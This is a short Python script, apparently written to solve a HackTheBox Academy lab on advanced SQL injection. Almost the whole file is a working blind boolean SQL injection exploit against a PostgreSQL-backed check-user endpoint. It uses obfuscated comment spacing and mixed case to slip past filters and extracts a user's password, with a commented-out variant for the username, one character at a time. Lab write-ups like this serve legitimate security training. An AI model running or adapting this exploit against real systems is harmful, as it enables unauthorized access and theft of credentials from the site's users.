#!/usr/bin/env python3

"""Created this script to solve the HackTheBox Academy lab called 'Skills Assessment' for the module called 'Advanced SQL Injections'. 
This script exploits a postgreSQL injection to dump credentials for log in."""

import requests
import string

target= f"10.129.204.251:8080" # Change this
proxies= {"http":"http://127.0.0.1:8081"} # Change this
charlist= range(32,127)
numlist= range(1,20)

def sqli():
    count=0
    for num in numlist:
        if count > 100:
            break
        for char in charlist:                     
            # Dump data
            #params=f"u=admin'/**_**/AnD/**_**/(seLeCt/**_**/subStrINg(username,{num},1)fRoM/**_**/users/**_**/lIMit/**_**/1/**_**/ofFSet/**_**/0)='{char}'--test"
            
            params= f"u=admin'/**_**/AnD/**_**/ASCii(subStrINg((SelECT/**_**/passwOrd/**_**/fRoM/**_**/users/**_**/limIT/**_**/1/**_**/offSET/**_**/0),{num},1))={char}--test"
                       
            response= requests.get(url=f"http://{target}/api/v1/check-user", proxies=proxies, params=params, verify=False, allow_redirects=False)
             
            if 'true' in response.text:
                print(f"{num}:{chr(char)}")
                count=0
                break
            else:
                count+=1
                pass

try:
    sqli()
except KeyboardInterrupt:
    print("Ctrl + C detected, exiting gracefully")
